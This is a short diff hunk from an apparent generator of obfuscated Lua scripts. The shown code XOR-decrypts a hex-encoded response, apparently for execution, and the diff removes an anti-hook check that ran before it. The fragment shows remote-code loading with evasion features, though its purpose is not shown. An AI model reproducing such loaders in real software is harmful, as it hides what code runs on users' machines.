@@ -559,8 +559,6 @@ if s and r then
 
   -- Handle encrypted response
   if ${varNames.isHex}(r) then
-    -- Additional integrity check before execution
-    if not ${varNames.antiHook}() then return end
     
     local d = ${varNames.bytesToString}(${varNames.xorBytes}(${varNames.hexBytes}(r), kb))
     
